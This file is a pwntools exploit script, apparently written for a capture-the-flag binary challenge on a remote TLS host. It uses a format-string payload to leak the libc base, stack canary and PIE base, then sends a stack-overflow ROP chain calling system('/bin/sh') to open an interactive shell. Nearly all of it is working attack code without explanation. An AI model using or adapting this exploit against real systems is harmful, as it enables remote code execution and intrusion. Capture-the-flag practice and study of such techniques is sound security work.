#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host blackhat4-7f2e50edc83bf6553ea8e1352db6eea2-0.chals.bh.ctf.sa --port 443 ./main
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./main')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'blackhat4-7f2e50edc83bf6553ea8e1352db6eea2-0.chals.bh.ctf.sa'
port = int(args.PORT or 443)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port,ssl=True, sni=host)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *get_name+78
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

libc = ELF("./libc-2.27.so")

p =b'%23$p-%11$p-%10$p'
io.sendlineafter(b"name:",p)
io.recvuntil(b"you ")
data = str(io.recvline()[0:-1]).split('-')
print(data[0])
libc.address = int(data[0][2:],16) - 231 - libc.sym['__libc_start_main']
canary = int(data[1],16)
exe.address = int(data[2][:-1],16) - exe.sym['_start']
print (hex(libc.address))
pop_rdi = next(libc.search(asm("pop rdi ; ret")))
bin_sh = next(libc.search(b"/bin/sh"))
print (exe.got['puts'])
p = b'a'*(56)
p += p64(canary)
p += p64(0)
p += p64(pop_rdi+1)
p += p64(pop_rdi)
p += p64(bin_sh)
# p += p64(exe.plt['puts'])
p += p64(libc.sym['system'])
io.sendlineafter(b"me :).\n",p)
# io.recvuntil(b"next time :D")
# io.recv(2)
# leak_puts = u64(io.recv(6).ljust(8,b"\x00"))
# print (hex(leak_puts))
io.interactive()

